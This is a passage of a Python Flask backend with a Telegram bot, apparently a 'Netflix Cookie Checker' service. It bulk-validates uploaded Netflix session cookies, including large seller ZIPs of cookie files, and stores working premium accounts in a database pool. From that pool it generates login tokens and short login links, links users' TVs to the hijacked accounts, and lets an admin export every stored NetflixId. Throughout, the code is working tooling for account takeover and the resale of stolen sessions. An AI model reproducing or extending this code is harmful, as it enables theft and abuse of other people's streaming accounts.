            result = requests.patch(update_url, headers=headers, json=account_data, timeout=30)
            if result.status_code in [200, 204]:
                fetch = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}", headers=headers)
                return True, fetch.json()[0] if fetch.status_code == 200 else None
        else:
            insert_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts"
            result = requests.post(insert_url, headers=headers, json=account_data, timeout=30)
            if result.status_code == 201:
                return True, result.json()[0] if result.json() else None

        return False, None

    except Exception as e:
        logger.error(f"Error storing account: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False, None

def log_token_generation(account_id, user_id, ip_address, token=None):
    try:
        headers = supabase_service_headers('return=representation')
        
        log_data = {
            'account_id': str(account_id),
            'generated_by': str(user_id),
            'ip_address': str(ip_address) if ip_address else None
        }
        
        if token:
            log_data['token_hash'] = hashlib.sha256(token.encode()).hexdigest()[:32]
            log_data['token'] = token[:100]
        
        url = f"{SUPABASE_URL}/rest/v1/token_logs"
        resp = requests.post(url, headers=headers, json=log_data, timeout=5)
        
        if resp.status_code == 201:
            logger.info(f"Token log SUCCESS")
            return True
        else:
            logger.error(f"Token log FAILED: {resp.status_code} - {resp.text}")
            return False
        
    except Exception as e:
        logger.error(f"Token log FAILED: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return False

# =============================================================================
# ROUTES START HERE
# =============================================================================

@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Netflix Cookie Checker API running"})

# @app.route('/')
# def serve_index():
#     return jsonify({
#         "status": "ok",
#         "message": "Netflix Cookie Checker API is running",
#         "endpoints": {
#             "test": "/api/test",
#             "signup": "/api/auth/signup",
#             "login": "/api/auth/login",
#             "check": "/api/check",
#             "accounts": "/api/accounts"
#         }
#     })

@app.route('/api/auth/signup', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def signup():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = create_auth_client().auth.sign_up({
            "email": email,
            "password": password
        })
        
        return jsonify({
            'status': 'success',
            'message': 'User created successfully',
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': str(e)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/test', methods=['GET', 'OPTIONS'])
def test():
    return jsonify({"status": "ok", "message": "API is working!"})

@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def login():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_client = create_auth_client()
        auth_response = auth_client.auth.sign_in_with_password({
            "email": email,
            "password": password
        })

        user_data, profile = get_user_profile(auth_response.user)
        is_admin = user_data['is_super_admin']

        if is_admin and not profile.get('is_super_admin', False):
            supabase.table('user_profiles').update({
                'is_super_admin': True,
                'role': 'super_admin'
            }).eq('id', auth_response.user.id).execute()

        return jsonify({
            'status': 'success',
            'session': serialize_session(auth_response.session),
            'user': user_data
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/refresh', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@limiter.limit("20 per minute")
def refresh_auth_session():
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json(silent=True) or {}
        refresh_token = data.get('refresh_token', '')
        if not refresh_token or len(refresh_token) > 4096:
            return jsonify({'status': 'error', 'message': 'Refresh token required'}), 400

        auth_client = create_auth_client()
        auth_response = auth_client.auth.refresh_session(refresh_token)
        if not auth_response.session or not auth_response.user:
            return jsonify({'status': 'error', 'message': 'Unable to refresh session'}), 401

        user_data, _ = get_user_profile(auth_response.user)
        return jsonify({
            'status': 'success',
            'session': serialize_session(auth_response.session),
            'user': user_data
        })
    except AuthApiError:
        return jsonify({'status': 'error', 'message': 'Session expired. Please log in again.'}), 401
    except Exception as exc:
        logger.error(f"Session refresh failed: {exc}")
        return jsonify({'status': 'error', 'message': 'Auth service temporarily unavailable'}), 503


@app.route('/api/auth/logout', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def logout(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    # The API is stateless. The browser removes its access and refresh tokens.
    # Avoid signing out the shared service-role client, which may serve other users.
    return jsonify({'status': 'success', 'message': 'Logged out successfully'})

@app.route('/api/auth/me', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_current_user(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        user_data, _ = get_user_profile(user)
        return jsonify({
            'status': 'success',
            'user': user_data
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/export/netflix-ids', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def export_netflix_ids(user):
    if request.method == 'OPTIONS':
        return '', 204

    try:
        all_ids = []
        limit = 1000
        offset = 0

        while True:
            result = supabase.table('netflix_accounts')\
                .select('netflix_id')\
                .eq('is_active', True)\
                .limit(limit)\
                .offset(offset)\
                .execute()

            batch = [acc['netflix_id'] for acc in (result.data or []) if acc.get('netflix_id')]
            all_ids.extend(batch)

            if len(batch) < limit:
                break

            offset += limit

        if not all_ids:
            return jsonify({"status": "error", "message": "No active accounts found"}), 404

        # Create ZIP file with one txt per NetflixId
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, netflix_id in enumerate(all_ids, 1):
                content = f"NetflixId={netflix_id}\n"
                filename = f"NetflixId_{idx:04d}.txt"
                zf.writestr(filename, content)

        memory_file.seek(0)

        response = Response(memory_file.getvalue(), mimetype='application/zip')
        response.headers['Content-Disposition'] = 'attachment; filename=netflix_ids_to_recheck.zip'
        response.headers['Content-Length'] = str(len(memory_file.getvalue()))
        return response

    except Exception as e:
        logger.error(f"Export ZIP error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
        
@app.route('/api/check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def check_cookie(user):
    if request.method == 'OPTIONS':
        return '', 204
    
    data, errors = validate_input(request.get_json())
    if errors:
        return jsonify({'status': 'error', 'message': 'Invalid input', 'errors': errors}), 400
        
    try:
        content = data.get('content', '')
        mode = data.get('mode', 'check_only')
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'})
        
        # Extract BOTH credentials
        credentials = extract_netflix_credentials(content)
        if not credentials:
            return jsonify({'status': 'error', 'message': 'No NetflixId found'})
        
        netflix_id = credentials['netflix_id']
        secure_netflix_id = credentials['secure_netflix_id']
        
        # Build cookie dict with BOTH IDs
        cookie_dict = {"NetflixId": netflix_id}
        if secure_netflix_id:
            cookie_dict["SecureNetflixId"] = secure_netflix_id
        
        account_info = check_netflix_cookie(cookie_dict)
        
        if not account_info["ok"]:
            return jsonify({
                "status": "error",
                "message": account_info.get('err', 'Invalid account')
            })
        
        is_premium_user = has_premium_access(user.id)
        is_admin = is_super_admin(user.id)
        
        is_ph_premium = (account_info["country"] == "PH" and 
                        account_info["premium"] and 
                        "Premium" in account_info.get("plan", ""))
        
        account_db_id = None
        if account_info["ok"] and account_info["premium"]:
            can_be_exclusive = is_admin and is_ph_premium
            
            success, db_record = store_netflix_account(
                email=account_info["email"],
                netflix_id=netflix_id,
                secure_netflix_id=secure_netflix_id,  # NEW
                subscription_type=account_info["subscription_type"],
                country=account_info["country"],
                plan=account_info["plan"],
                cookie_content=content,
                user_id=user.id,
                signup_country=account_info.get("signup_country"),
                detection_method=account_info.get("detection_method"),
                is_exclusive=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                reserved_for_admin=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                next_billing_date=account_info.get('next_billing_date'),
                days_until_billing=account_info.get('days_until_billing'),
                is_expired=account_info.get('is_expired', False)
            )
            if success and db_record:
                account_db_id = db_record.get('id')
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        if mode == 'check_only':
            if account_db_id:
                log_token_generation(
                    account_id=account_db_id,
                    user_id=user.id,
                    ip_address=request.remote_addr,
                    token=None
                )
            
            return jsonify({
                "status": "success",
                "data": {
                    "email": account_info["email"],
                    "country": account_info["country"],
                    "plan": account_info["plan"],
                    "is_premium": account_info["premium"],
                    "subscription_type": account_info["subscription_type"],
                    "mode": "check_only",
                    "stored_in_db": account_info["ok"] and account_info["premium"],
                    "is_exclusive": is_ph_premium and not is_admin
                }
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        if account_db_id:
            log_token_generation(
                account_id=account_db_id,
                user_id=user.id,
                ip_address=request.remote_addr,
                token=token_result["token"]
            )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account_info["email"],
                "country": account_info["country"],
                "plan": account_info["plan"],
                "is_premium": account_info["premium"],
                "subscription_type": account_info["subscription_type"],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"],
                "mode": "generate_token"
            }
        })
            
    except Exception as e:
        logger.error(f"Error in check_cookie: {str(e)}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/batch-check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def batch_check(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    temp_dirs = []
    
    try:
        files = request.files.getlist('files')
        mode = request.form.get('mode', 'check_only')
        
        if not files:
            return jsonify({'status': 'error', 'message': 'No files provided'}), 400
        
        is_premium_user = has_premium_access(user.id)
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        results = []
        total_files = len(files)
        
        def generate_progress():
            nonlocal results
            
            for index, file in enumerate(files, 1):
                filename = file.filename
                progress_data = {
                    'type': 'progress',
                    'current': index,
                    'total': total_files,
                    'filename': filename,
                    'percent': int((index / total_files) * 100)
                }
                yield f"data: {json.dumps(progress_data)}\n\n"
                
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
                
                result_data = {
                    'type': 'result',
                    'result': result,
                    'current': index,
                    'total': total_files
                }
                yield f"data: {json.dumps(result_data)}\n\n"
            
            completion_data = {
                'type': 'complete',
                'results': results,
                'summary': {
                    'total': len(results),
                    'valid': len([r for r in results if r['status'] == 'success']),
                    'invalid': len([r for r in results if r['status'] == 'error'])
                }
            }
            yield f"data: {json.dumps(completion_data)}\n\n"
        
        if request.headers.get('Accept') == 'application/json':
            for file in files:
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
            
            return jsonify({
                "status": "success",
                "results": results
            })
        
        return Response(
            stream_with_context(generate_progress()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no'
            }
        )
        
    except Exception as e:
        logger.error(f"Batch check error: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
    
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

def process_single_file(file, mode, is_premium_user, user_id):
    filename = file.filename
    
    try:
        if filename.lower().endswith('.zip'):
            unique_dir = tempfile.mkdtemp(prefix=f"batch_", dir=TEMP_DIR)
            zip_path = os.path.join(unique_dir, filename)
            file.save(zip_path)
            txt_files = extract_zip_and_get_files(zip_path, unique_dir)
            
            if txt_files:
                with open(txt_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return process_content(content, os.path.basename(txt_files[0]), mode, is_premium_user, user_id)
            else:
                return {
                    "status": "error", 
                    "filename": filename, 
                    "message": "No text files found in ZIP"
                }
        
        elif filename.lower().endswith('.txt'):
            content = file.read().decode('utf-8', errors='ignore')
            return process_content(content, filename, mode, is_premium_user, user_id)
        
        else:
            return {
                "status": "error", 
                "filename": filename, 
                "message": "Unsupported file type"
            }
            
    except Exception as e:
        return {
            "status": "error", 
            "filename": filename, 
            "message": str(e)
        }

def process_content(content, filename, mode, is_premium_user, user_id):
    credentials = extract_netflix_credentials(content)
    
    if not credentials:
        return {
            "status": "error", 
            "filename": filename, 
            "message": "No NetflixId found"
        }
    
    netflix_id = credentials['netflix_id']
    secure_netflix_id = credentials.get('secure_netflix_id')
    
    # Build cookie dict with BOTH IDs
    cookie_dict = {"NetflixId": netflix_id}
    if secure_netflix_id:
        cookie_dict["SecureNetflixId"] = secure_netflix_id
    
    account_info = check_netflix_cookie(cookie_dict)
    
    if not account_info["ok"]:
        return {
            "status": "error", 
            "filename": filename, 
            "message": account_info.get('err', 'Invalid account')
        }
    
    stored_in_db = False
    if account_info["ok"] and account_info.get("premium"):
        stored_in_db, _ = store_netflix_account(
            email=account_info["email"],
            netflix_id=netflix_id,
            secure_netflix_id=secure_netflix_id,
            subscription_type=account_info["subscription_type"],
            country=account_info["country"],
            plan=account_info["plan"],
            cookie_content=content,
            user_id=user_id,
            signup_country=account_info.get("signup_country"),
            detection_method=account_info.get("detection_method"),
            next_billing_date=account_info.get("next_billing_date"),
            days_until_billing=account_info.get("days_until_billing"),
            is_expired=account_info.get("is_expired", False)
        )
    
    result_data = {
        "status": "success",
        "filename": filename,
        "email": account_info["email"],
        "country": account_info["country"],
        "plan": account_info["plan"],
        "is_premium": account_info["premium"],
        "subscription_type": account_info["subscription_type"],
        "mode": mode,
        "stored_in_db": stored_in_db
    }
    
    if mode == 'generate_token' and is_premium_user:
        token_result = generate_token(netflix_id)
        if token_result["status"] == "Success":
            result_data["token"] = token_result["token"]
            result_data["expires"] = token_result["expires"]
            result_data["login_urls"] = token_result["login_urls"]
        else:
            result_data["token_error"] = token_result.get("error", "Failed")
    
    return result_data


# =============================================================================
# TELEGRAM COOKIE BATCH BOT
# =============================================================================
def _telegram_env_int(name, default, minimum, maximum):
    try:
        value = int(os.environ.get(name, str(default)))
    except (TypeError, ValueError):
        value = default
    return max(minimum, min(value, maximum))


def _telegram_allowed_users():
    allowed = set()
    for value in os.environ.get('TELEGRAM_ALLOWED_USER_IDS', '').split(','):
        value = value.strip()
        if value.lstrip('-').isdigit():
            allowed.add(int(value))
    return allowed


def _telegram_api(method, payload=None, timeout=20):
    token = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
    if not token:
        raise RuntimeError('TELEGRAM_BOT_TOKEN is not configured')
    response = requests.post(
        f'https://api.telegram.org/bot{token}/{method}',
        json=payload or {},
        timeout=timeout
    )
    try:
        data = response.json()
    except ValueError as exc:
        raise RuntimeError(f'Telegram returned HTTP {response.status_code}') from exc
    if response.status_code != 200 or not data.get('ok'):
        raise RuntimeError(data.get('description') or f'Telegram API error {response.status_code}')
    return data.get('result')


def _telegram_send(chat_id, text, reply_markup=None, parse_mode=None):
    """Send plain text in chunks without ever including cookie values."""
    text = str(text or '')
    chunks = []
    if parse_mode:
        # Telegram applies the message limit after parsing entities. Keeping the
        # HTML intact prevents splitting inside a hidden href attribute.
        chunks = [text]
    while text:
        if chunks:
            break
        if len(text) <= 3500:
            chunks.append(text)
            break
        split_at = text.rfind('\n', 0, 3500)
        if split_at < 1000:
            split_at = 3500
        chunks.append(text[:split_at])
        text = text[split_at:].lstrip('\n')
    try:
        last_message = None
        outgoing_chunks = chunks or ['']
        for index, chunk in enumerate(outgoing_chunks):
            payload = {'chat_id': chat_id, 'text': chunk}
            if parse_mode:
                payload['parse_mode'] = parse_mode
                payload['link_preview_options'] = {'is_disabled': True}
            if reply_markup and index == len(outgoing_chunks) - 1:
                payload['reply_markup'] = reply_markup
            last_message = _telegram_api('sendMessage', payload)
        return last_message
    except Exception as exc:
        logger.error(f'Telegram sendMessage failed: {exc}')
        return None


def _telegram_edit(chat_id, message_id, text, reply_markup=None, parse_mode=None):
    if not message_id:
        return None
    message_text = str(text or '')
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': message_text if parse_mode else message_text[:3500]
    }
    if parse_mode:
        payload['parse_mode'] = parse_mode
        payload['link_preview_options'] = {'is_disabled': True}
    if reply_markup:
        payload['reply_markup'] = reply_markup

    last_error = None
    for attempt in range(3):
        try:
            return _telegram_api('editMessageText', payload, timeout=12)
        except Exception as exc:
            last_error = exc
            error_text = str(exc).lower()
            # A previous timed-out edit may still have reached Telegram.
            if 'message is not modified' in error_text:
                return {'message_id': message_id}
            if not isinstance(exc, requests.RequestException) or attempt == 2:
                break
    logger.warning(f'Telegram progress update failed: {last_error}')
    return None


def _telegram_download_document(document):
    max_bytes = _telegram_env_int(
        'TELEGRAM_MAX_UPLOAD_MB', 12, 1, 20
    ) * 1024 * 1024
    claimed_size = int(document.get('file_size') or 0)
    if claimed_size and claimed_size > max_bytes:
        raise ValueError(f'File is larger than the configured {max_bytes // (1024 * 1024)} MB limit')

    file_info = None
    last_error = None
    for attempt in range(3):
        try:
            file_info = _telegram_api(
                'getFile', {'file_id': document.get('file_id')}, timeout=30
            )
            break
        except requests.RequestException as exc:
            last_error = exc
            if attempt == 2:
                raise
    if file_info is None and last_error:
        raise last_error
    file_path = (file_info or {}).get('file_path')
    if not file_path:
        raise RuntimeError('Telegram did not return a downloadable file path')

    token = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
    response = None
    for attempt in range(3):
        try:
            response = requests.get(
                f'https://api.telegram.org/file/bot{token}/{file_path}',
                timeout=60
            )
            response.raise_for_status()
            break
        except requests.RequestException:
            if attempt == 2:
                raise
    if response is None:
        raise RuntimeError('Telegram file download failed')
    if len(response.content) > max_bytes:
        raise ValueError(f'File is larger than the configured {max_bytes // (1024 * 1024)} MB limit')
    return response.content


def _telegram_cookie_files(payload, filename):
    """Read bounded text cookie files in memory; never extract ZIP paths to disk."""
    filename = os.path.basename(filename or 'upload.zip')
    extension = os.path.splitext(filename)[1].lower()
    if extension in ('.txt', '.json', '.cookies'):
        return [(filename, payload.decode('utf-8', errors='ignore'))]
    if extension != '.zip':
        raise ValueError('Upload a .zip, .txt, .json, or .cookies file')

    # Large seller/export ZIPs commonly contain hundreds of cookie files.
    # The high ceiling is only an emergency ZIP-bomb guard, not a normal batch limit.
    max_files = _telegram_env_int('TELEGRAM_MAX_COOKIE_FILES', 3000, 1, 5000)
    max_uncompressed = _telegram_env_int(
        'TELEGRAM_MAX_UNCOMPRESSED_MB', 50, 1, 100
    ) * 1024 * 1024
    supported = ('.txt', '.json', '.cookies')
    extracted = []
    total_uncompressed = 0

    try:
        with zipfile.ZipFile(io.BytesIO(payload), 'r') as archive:
            entries = [
                item for item in archive.infolist()
                if not item.is_dir() and os.path.splitext(item.filename)[1].lower() in supported
            ]
            if not entries:
                raise ValueError('The ZIP contains no supported cookie text files')
            if len(entries) > max_files:
                raise ValueError(f'The ZIP contains {len(entries)} cookie files; limit is {max_files}')

            for item in entries:
                if item.flag_bits & 0x1:
                    raise ValueError('Encrypted ZIP files are not supported')
                total_uncompressed += item.file_size
                if total_uncompressed > max_uncompressed:
                    raise ValueError('ZIP is too large after decompression')
                content = archive.read(item).decode('utf-8', errors='ignore')
                extracted.append((os.path.basename(item.filename), content))
    except zipfile.BadZipFile as exc:
        raise ValueError('The uploaded ZIP file is damaged or invalid') from exc

    return extracted


def _telegram_claim_update(update_id, telegram_user_id, chat_id, filename):
    """Deduplicate Telegram retries; fail closed when the job ledger is unavailable."""
    headers = supabase_service_headers(
        'resolution=ignore-duplicates,return=representation'
    )
    try:
        response = requests.post(
            f'{SUPABASE_URL}/rest/v1/telegram_bot_jobs',
            params={'on_conflict': 'update_id'},
            headers=headers,
            json={
                'update_id': update_id,
                'telegram_user_id': telegram_user_id,
                'chat_id': chat_id,
                'filename': str(filename or '')[:255],
                'status': 'processing'
            },
            timeout=15
        )
        if response.status_code in (200, 201):
            return bool(response.json())
        logger.error(f'Telegram job claim failed ({response.status_code}); refusing unsafe duplicate processing')
    except Exception as exc:
        logger.error(f'Telegram job claim error; refusing unsafe duplicate processing: {exc}')
    return None


def _telegram_finish_update(update_id, status, summary=None, error=None):
    try:
        requests.patch(
            f'{SUPABASE_URL}/rest/v1/telegram_bot_jobs',
            params={'update_id': f'eq.{update_id}'},
            headers=supabase_service_headers('return=minimal'),
            json={
                'status': status,
                'summary': summary,
                'error': str(error)[:500] if error else None,
                'completed_at': datetime.now(timezone.utc).isoformat()
            },
            timeout=15
        )
    except Exception as exc:
        logger.error(f'Unable to finish Telegram job {update_id}: {exc}')


def _telegram_process_upload(payload, filename, database_user_id, progress_callback=None):
    files = _telegram_cookie_files(payload, filename)
    results = []
    unique_files = []
    fingerprints = set()

    for entry_name, content in files:
        credentials = extract_netflix_credentials(content)
        if not credentials:
            results.append({
                'status': 'error',
                'filename': entry_name,
                'message': 'No NetflixId found'
            })
            continue
        fingerprint = hashlib.sha256(
            credentials['netflix_id'].encode('utf-8', errors='ignore')
        ).hexdigest()
        if fingerprint in fingerprints:
            results.append({
                'status': 'duplicate',
                'filename': entry_name,
                'message': 'Duplicate cookie skipped'
            })
            continue
        fingerprints.add(fingerprint)
        unique_files.append((entry_name, content))

    total = len(results) + len(unique_files)
    if progress_callback:
        progress_callback(len(results), total, results)

    workers = min(
        _telegram_env_int('TELEGRAM_MAX_WORKERS', 12, 1, 20),
        len(unique_files)
    )
    if workers:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {
                executor.submit(
                    process_content, content, entry_name, 'check_only', True, database_user_id
                ): entry_name
                for entry_name, content in unique_files
            }
            for future in as_completed(futures):
                entry_name = futures[future]
                try:
                    results.append(future.result())
                except Exception as exc:
                    results.append({
                        'status': 'error',
                        'filename': entry_name,
                        'message': str(exc)
                    })
                if progress_callback:
                    progress_callback(len(results), total, results)
    return results


def _telegram_progress_message(filename, completed, total, results):
    valid = len([item for item in results if item.get('status') == 'success'])
    saved = len([
        item for item in results
        if item.get('status') == 'success' and item.get('stored_in_db')
    ])
    invalid = len([item for item in results if item.get('status') == 'error'])
    duplicates = len([item for item in results if item.get('status') == 'duplicate'])
    percent = int((completed / total) * 100) if total else 100
    filled = min(10, max(0, int(percent / 10)))
    bar = '[' + ('#' * filled) + ('-' * (10 - filled)) + ']'
    return (
        f'Checking {os.path.basename(filename)}\n'
        f'{bar} {completed}/{total} ({percent}%)\n'
        f'Valid: {valid} | Saved: {saved}\n'
        f'Invalid: {invalid} | Duplicates: {duplicates}'
    )


def _telegram_results_message(filename, results):
    valid = [item for item in results if item.get('status') == 'success']
    saved = [item for item in valid if item.get('stored_in_db')]
    duplicates = [item for item in results if item.get('status') == 'duplicate']
    invalid = [item for item in results if item.get('status') == 'error']
    lines = [
        '📦 BATCH CHECK COMPLETE',
        '━━━━━━━━━━━━━━━━━━━━',
        f'📄 {os.path.basename(filename)}',
        '',
        '📊 SUMMARY',
        f'├ 🔎 Checked: {len(results)}',
        f'├ ✅ Valid: {len(valid)}',
        f'├ 💾 Saved/updated: {len(saved)}',
        f'├ ❌ Invalid: {len(invalid)}',
        f'└ ♻️ Duplicates skipped: {len(duplicates)}'
    ]

    return '\n'.join(lines), {
        'total': len(results),
        'valid': len(valid),
        'saved': len(saved),
        'invalid': len(invalid),
        'duplicates': len(duplicates)
    }


def _account_was_recently_validated(account, freshness_minutes=None):
    """Use a recent successful database check without immediately hitting Netflix again."""
    if freshness_minutes is None:
        freshness_minutes = _telegram_env_int(
            'TELEGRAM_VALIDATION_FRESH_MINUTES', 60, 1, 1440
        )
    raw_checked = str(account.get('last_checked') or '').strip()
    if not raw_checked:
        return False
    try:
        checked_at = datetime.fromisoformat(raw_checked.replace('Z', '+00:00'))
        if checked_at.tzinfo is None:
            checked_at = checked_at.replace(tzinfo=timezone.utc)
    except (TypeError, ValueError):
        return False
    age = datetime.now(timezone.utc) - checked_at.astimezone(timezone.utc)
    return timedelta(0) <= age <= timedelta(minutes=freshness_minutes)


def _telegram_priority_pool(per_tier=None, prefer_recent=False):
    if per_tier is None:
        per_tier = _telegram_env_int(
            'TELEGRAM_ACCOUNT_ATTEMPTS_PER_TIER', 6, 1, 15
        )
    candidates = _get_random_tv_candidates(None)
    return _prioritized_tv_candidates(
        candidates, per_tier, prefer_recent=prefer_recent
    )


def _telegram_tv_login(code, database_user_id, chat_id, message_id, ip_address):
    try:
        candidates = _telegram_priority_pool()
    except Exception as exc:
        logger.exception('Telegram TV candidate loading failed')
        return False, f'Unable to load the account pool: {exc}'
    if not candidates:
        return False, 'No active accounts with both NetflixId cookies are available.'

    timeout_seconds = _telegram_env_int('TELEGRAM_TV_TIMEOUT_SECONDS', 90, 30, 240)
    started_at = time.monotonic()
    attempts = 0
    skipped = []
    for account in candidates:
        if attempts and time.monotonic() - started_at >= timeout_seconds:
            break
        attempts += 1
        _, tier_label = _tv_candidate_priority(account)
        _telegram_edit(
            chat_id,
            message_id,
            f'TV login: checking account {attempts}/{len(candidates)}\n'
            f'Priority group: {tier_label}\n'
            'Validating membership and TV-login compatibility...'
        )

        cookie_dict = {
            'NetflixId': account['netflix_id'],
            'SecureNetflixId': account['secure_netflix_id']
        }
        is_valid, info = validate_netflix_cookie_quick(cookie_dict)
        _record_tv_validation(account, is_valid, info)
        if not is_valid:
            skipped.append((info or {}).get('err', 'Cookie validation failed'))
            continue

        prepare_status, prepare_reason, prepared = _prepare_tv_candidate(account)
        if prepare_status != 'ready':
            skipped.append(prepare_reason)
            if prepare_status == 'invalid':
                _record_tv_validation(account, False, {'err': prepare_reason})
            continue

        result_status, result_message, deactivate = _activate_tv_candidate(prepared, code)
        if result_status == 'success':
            log_tv_auth_attempt(database_user_id, code, 'success', ip_address)
            summary = _tv_account_summary(account)
            return True, (
                f'TV linked successfully.\n\n'
                f'Account: {summary["email"]}\n'
                f'Country: {summary["country"]}\n'
                f'Plan: {summary["plan"]}\n'
                f'Priority group: {tier_label}\n'
                f'Accounts checked: {attempts}\n\n'
                f'{result_message}'
            )
        if result_status == 'account_failure':
            skipped.append(result_message)
            if deactivate:
                _record_tv_validation(account, False, {'err': result_message})
            continue

        log_tv_auth_attempt(database_user_id, code, 'failed', ip_address)
        return False, result_message

    log_tv_auth_attempt(database_user_id, code, 'no_working_account', ip_address)
    timed_out = time.monotonic() - started_at >= timeout_seconds
    reason = skipped[-1] if skipped else 'No compatible account passed validation'
    if timed_out:
        return False, f'TV login stopped after the {timeout_seconds}-second safety window. Last result: {reason}'
    return False, f'No usable account was found after {attempts} prioritized attempt(s). Last result: {reason}'


def _telegram_create_short_login_urls(token_result, database_user_id, base_url):
    """Store the long Netflix token server-side and return copy-button-safe URLs."""
    token = str((token_result or {}).get('token') or '')
    if not token:
        return None, 'Netflix did not return a login token.'
    try:
        expires_epoch = int((token_result or {}).get('expires') or 0)
        expires_at = datetime.fromtimestamp(expires_epoch, timezone.utc)
    except (TypeError, ValueError, OSError, OverflowError):
        expires_at = datetime.now(timezone.utc) + timedelta(hours=1)
    if expires_at <= datetime.now(timezone.utc):
        expires_at = datetime.now(timezone.utc) + timedelta(hours=1)

    headers = supabase_service_headers('return=minimal')
    try:
        # Opportunistic cleanup keeps the short-link table small without another cron.
        requests.delete(
            f'{SUPABASE_URL}/rest/v1/telegram_short_links',
            params={'expires_at': f'lt.{datetime.now(timezone.utc).isoformat()}'},
            headers=headers,
            timeout=5
        )
        for _ in range(3):
            code = secrets.token_urlsafe(18)
            response = requests.post(
                f'{SUPABASE_URL}/rest/v1/telegram_short_links',
                headers=headers,
                json={
                    'code': code,
                    'nftoken': token,
                    'created_by': str(database_user_id),
                    'expires_at': expires_at.isoformat()
                },
                timeout=15
            )
            if response.status_code in (200, 201):
                origin = str(base_url or '').rstrip('/')
                return {
                    'phone': f'{origin}/t/{code}/phone',
                    'tv': f'{origin}/t/{code}/tv',
                    'pc': f'{origin}/t/{code}/pc'
                }, None
            if response.status_code != 409:
                try:
                    error_payload = response.json()
                except ValueError:
                    error_payload = {}
                error_code = str(error_payload.get('code') or '').strip()
                error_message = str(error_payload.get('message') or response.text or '').strip()
                logger.error(
                    'Telegram short-link insert failed: HTTP %s, code=%s, response=%s',
                    response.status_code,
                    error_code or 'unknown',
                    error_message[:500]
                )
                if response.status_code == 404 or error_code in ('PGRST204', 'PGRST205'):
                    return None, (
                        'Supabase REST has not loaded telegram_short_links yet. '
                        'Run the latest migration, including the schema-cache reload.'
                    )
                if response.status_code in (401, 403):
                    return None, (
                        'Supabase denied the backend service role. Verify '
                        'SUPABASE_SERVICE_KEY in Vercel and run the latest migration grants.'
                    )
                detail = f'HTTP {response.status_code}'
                if error_code:
                    detail += f' / {error_code}'
                if error_message:
                    detail += f': {error_message[:160]}'
                return None, f'Supabase could not save the short login link ({detail}).'
    except Exception as exc:
        logger.error(f'Telegram short-link creation failed: {exc}')
        return None, f'Short-link request failed: {str(exc)[:160]}'
